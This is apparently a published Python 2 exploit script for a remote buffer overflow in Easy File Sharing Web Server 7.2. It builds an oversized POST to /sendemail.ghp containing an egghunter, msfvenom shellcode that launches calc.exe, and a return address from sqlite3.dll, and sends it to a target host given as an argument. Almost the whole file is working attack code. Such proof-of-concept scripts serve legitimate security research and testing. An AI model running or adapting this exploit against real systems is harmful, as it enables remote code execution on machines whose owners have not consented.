# Exploit Title: Easy File Sharing Web Server 7.2 - 'POST' Remote Buffer Overflow (Egghunter)
# Vendor Homepage: http://www.sharing-file.com/
# Software Link: http://www.sharing-file.com/efssetup.exe
# Exploit author: Felipe Winsnes
# Version: 7.2
# Tested on: Windows XP x86, Windows 7 x86

#!/usr/bin/python

import httplib
import sys
import struct

egghunter = ""
egghunter += "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74"
egghunter += "\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

# msfvenom -p windows/exec CMD=calc.exe -f py -b "\x00\x7e\x2b\x26\x3d\x25\x3a\x22\x0a\x0d\x20\x2f\x5c\x2e" EXITFUNC=thread

buf =  b"w00tw00t"
buf += b"\x33\xc9\x83\xe9\xcf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
buf += b"\x76\x0e\x91\x85\xc8\xe5\x83\xee\xfc\xe2\xf4\x6d\x6d"
buf += b"\x4a\xe5\x91\x85\xa8\x6c\x74\xb4\x08\x81\x1a\xd5\xf8"
buf += b"\x6e\xc3\x89\x43\xb7\x85\x0e\xba\xcd\x9e\x32\x82\xc3"
buf += b"\xa0\x7a\x64\xd9\xf0\xf9\xca\xc9\xb1\x44\x07\xe8\x90"
buf += b"\x42\x2a\x17\xc3\xd2\x43\xb7\x81\x0e\x82\xd9\x1a\xc9"
buf += b"\xd9\x9d\x72\xcd\xc9\x34\xc0\x0e\x91\xc5\x90\x56\x43"
buf += b"\xac\x89\x66\xf2\xac\x1a\xb1\x43\xe4\x47\xb4\x37\x49"
buf += b"\x50\x4a\xc5\xe4\x56\xbd\x28\x90\x67\x86\xb5\x1d\xaa"
buf += b"\xf8\xec\x90\x75\xdd\x43\xbd\xb5\x84\x1b\x83\x1a\x89"
buf += b"\x83\x6e\xc9\x99\xc9\x36\x1a\x81\x43\xe4\x41\x0c\x8c"
buf += b"\xc1\xb5\xde\x93\x84\xc8\xdf\x99\x1a\x71\xda\x97\xbf"
buf += b"\x1a\x97\x23\x68\xcc\xef\xc9\x68\x14\x37\xc8\xe5\x91"
buf += b"\xd5\xa0\xd4\x1a\xea\x4f\x1a\x44\x3e\x28\xf8\xbb\x8f"
buf += b"\xa0\x43\x04\x38\x55\x1a\x44\xb9\xce\x99\x9b\x05\x33"
buf += b"\x05\xe4\x80\x73\xa2\x82\xf7\xa7\x8f\x91\xd6\x37\x30"
buf += b"\xf2\xe4\xa4\x86\xbf\xe0\xb0\x80\x91\x85\xc8\xe5"

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

push_esp_ret = struct.pack("<I", 0x61C227FA) # \x54\xC3 sqlite3.dll
host = sys.argv[1]
buffer = "A" * 3750 + buf + "\x90" * 20 + egghunter + "A" * 42 + push_esp_ret + "\xEB\xB8"

print bcolors.OKGREEN + "[+]" + bcolors.ENDC + " Sending payload!"

httpServ = httplib.HTTPConnection(sys.argv[1], 80)
httpServ.connect()

httpServ.request('POST', '/sendemail.ghp',
'Email=%s&getPassword=Get+Password' %buffer)

response = httpServ.getresponse()

httpServ.close()
